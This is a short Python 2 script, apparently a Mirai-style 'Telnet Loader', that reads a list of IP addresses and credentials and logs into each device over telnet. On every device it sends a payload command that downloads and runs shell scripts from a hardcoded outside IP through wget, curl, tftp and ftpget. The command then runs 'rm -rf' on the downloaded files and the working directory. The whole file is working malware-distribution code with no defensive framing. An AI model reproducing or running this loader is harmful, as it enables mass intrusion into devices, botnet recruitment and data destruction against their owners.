#!/usr/bin/python
# Simple Telnet Loader | By; LiGhT

import sys, re, os, socket, time
from threading import Thread

if len(sys.argv) < 2:
	sys.exit("\033[37mUsage: python "+sys.argv[0]+" [list]")

cmd="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://193.124.180.158/wickedmeme.sh; curl -O http://193.124.180.158/wickedmeme.sh; chmod 777 wickedmeme.sh; sh wickedmeme.sh; tftp 193.124.180.158 -c get wickedmemetftp1.sh; chmod 777 wickedmemetftp1.sh; sh wickedmemetftp1.sh; tftp -r wickedmemetftp2.sh -g 193.124.180.158; chmod 777 wickedmemetftp2.sh; sh wickedmemetftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 193.124.180.158 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf wickedmeme.sh wickedmemetftp1.sh wickedmemetftp2.sh ftp1.sh; rm -rf *" #command to send
info = open(str(sys.argv[1]),'a+')

def sqwad(ip,username,password):
	ip = str(ip).rstrip("\n")
	username = username.rstrip("\n")
	password = password.rstrip("\n")
	try:
		tn = socket.socket()
		tn.settimeout(5)
		tn.connect((ip,23))
	except Exception:
		print "\033[32m[\033[31m+\033[32m] \033[31mFailed To Connect!\033[37m %s"%(ip)
		tn.close()
	try:
		hoho = ''
		hoho += readUntil(tn, "ogin")
		if "ogin" in hoho:
			tn.send(username + "\n")
			print "\033[32m[\033[31m+\033[32m] \033[35mSending Username!\033[37m %s"%(ip)
			time.sleep(0.09)
		else:
			pass
	except Exception:
		tn.close()
	try:
		hoho = ''
		hoho += readUntil(tn, "assword:")
		if "assword" in hoho:
			tn.send(password + "\n")
			print "\033[32m[\033[33m+\033[32m] \033[36mSending Password!\033[37m %s"%(ip)
			time.sleep(2)
		else:
			pass
	except Exception:
		tn.close()
	try:
		tn.send("sh" + "\n")
		time.sleep(0.009)
		tn.send("shell" + "\n")
		time.sleep(0.01)
		tn.send(cmd + "\n")
		print "\033[32m[\033[31m+\033[32m] \033[32mCommand Sent!\033[37m %s"%(ip) #False possitives because thats what yall wanted lmao
		time.sleep(15)
		tn.close()
	except Exception:
		tn.close()

def readUntil(tn, string, timeout=8):
	buf = ''
	start_time = time.time()
	while time.time() - start_time < timeout:
		buf += tn.recv(1024)
		time.sleep(0.01)
		if string in buf: return buf
	raise Exception('TIMEOUT!')

for x in info:
	try:
		if ":23 " in x:
			x = x.replace(":23 ", ":")
		xinfo = x.split(":")
		session = Thread(target=sqwad, args=(xinfo[0].rstrip("\n"),xinfo[1].rstrip("\n"),xinfo[2].rstrip("\n"),))
		session.start()
		ip=xinfo[0]
		username=xinfo[1]
		password=xinfo[2]
		time.sleep(0.01)
	except:
		pass